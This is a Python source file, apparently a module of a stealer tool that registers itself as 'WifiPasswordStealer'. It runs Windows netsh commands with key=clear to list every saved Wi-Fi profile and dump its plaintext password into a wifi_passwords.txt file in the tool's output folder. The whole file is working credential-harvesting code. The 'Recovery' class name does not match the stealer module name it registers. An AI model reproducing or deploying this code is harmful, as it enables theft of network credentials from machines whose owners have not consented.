import os
import subprocess

from config import ModuleManager


class WifiPasswordRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "WifiPasswordStealer")
        
        self.banner(r"""
     _______         _  _  _ _       _______ _ 
    |.-----.|       (_)(_)(_|_)     (_______|_)
    ||x . x||        _  _  _ _ _____ _____   _ 
    ||_.-._||       | || || | (_____)  ___) | |
    `--)-(--`       | || || | |     | |     | |
   __[=== o]___      \_____/|_|     |_|     |_|
  |:::::::::::|\    
  `-=========-`()            Passwords
                    """)

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'network')
        self.wifi_passwords_filename = os.path.join(self.systeminfo_folder, 'wifi_passwords.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
    
    def run(self) -> None:
        with open(self.wifi_passwords_filename, 'w+') as file:
            self.mdebug(f"Created file and starting to save wifi passwords to it -> {self.wifi_passwords_filename}")
            self.mdebug(f"Running command: `netsh wlan show profiles`")
            
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            
            self.mdebug(f"Found a total of {len(profiles)} WiFi networks")
            
            for i in profiles:
                try:
                    self.mdebug(f"Running command: `netsh wlan show profile {i} key=clear`")
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        self.mdebug(f"Found password of {i} wifi network")
                        file.write("\n{:<30}|  {:<}".format(i, results[0]))
                    except IndexError:
                        self.merror(f"Unable to get the password of {i} network. No password is available -> by Running `netsh wlan show profile {i} key=clear`")
                        file.write("\n{:<30}|  {:<}".format(i, ""))
                
                except subprocess.CalledProcessError:
                    self.merror(f"Unable to get the wifi password of {i} network -> Encoding Error")
                    file.write("\n{:<30}|  {:<}".format(i, "ENCODING ERROR"))
               
                except Exception as e:
                    self.merror(f"Unable to get the wifi password of {i} network -> {e}")
        
            self.mdebug(f"Saved all wifi passwords to {self.wifi_passwords_filename}")
        